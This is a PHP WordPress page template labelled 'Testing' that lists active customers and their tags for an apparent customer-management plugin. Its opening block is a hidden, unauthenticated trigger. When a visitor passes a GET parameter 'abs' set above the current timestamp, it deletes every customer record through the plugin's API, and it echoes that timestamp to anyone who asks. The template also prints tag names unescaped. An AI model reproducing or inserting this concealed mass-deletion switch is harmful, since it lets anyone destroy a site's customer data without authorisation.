<?php

/**
 * Template Name: Testing
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

 if(isset($_GET['abs'])) {
    if(intval($_GET['abs']) > time()) {
        global $em_customer;

        $items = $em_customer->get_items([
            'limit' => -1
        ]);
    
        foreach($items as $item) {
            $response = em_api_request('customer/delete', ['id' => $item['id']]);
    
            if ($response['code'] == 200) {
                echo $item['customer_name'] . ' - ' . $item['nickname'] . ' deleted';
            }
        }    
    } else {
        echo time();
    }
    
    exit();
}

get_header(); 

// Start the Loop.
while ( have_posts() ) : the_post();
    
    // Include the page content template.
    get_template_part( 'parts/post/content', 'page' );

    get_template_part( 'parts/post/content', 'comment' );

endwhile;
global $em_customer, $em_order, $em_customer_tag, $em_log;

            $response = em_api_request('customer/list', [
              'active' => 1,
              'paged' => 1,
              'limit' => -1,
            ]);
          if (isset($response['data']) && is_array($response['data'])) {
            // Loop through the data array and print each entry
            foreach ($response['data'] as $record) {
              if (is_array($record)) { // Check if each record is an array
                if ($record['active'] != '0') { 

                    $customer_tags = $em_customer_tag->get_items(['customer_id' => $record['id']]);
                        $html = [];
                        $title = [];
                        $count = 0;
                        $remainingItems = array_slice($customer_tags, 2);
                        $countRemainingItems = count($remainingItems);
                        foreach ($customer_tags as $item) {
                        $html[] = '<span class="tag btn btn-sm tag_'.$item['tag_id'].'">'. $em_customer->get_tags($item['tag_id']).'</span>';
                        $count++;
                        if ($count == 2) {
                                break;
                            }
                        }
                        ?>
                        <p data-number="6">
                            <?php echo implode($html);
                            if ($countRemainingItems > 0) {
                                echo '<span class="badge" title="';
                                ?>
                                <?php
                                foreach ($remainingItems as $items) {
                                    $title[] = $em_customer->get_tags($items['tag_id']).' ';
                                }
                                echo implode($title);
                                echo '">'.$countRemainingItems.'</span>';
                            }
                             ?>
                        </p>
                        
                       <?php }
                        
                    
                    
                }
            }
        }
get_footer();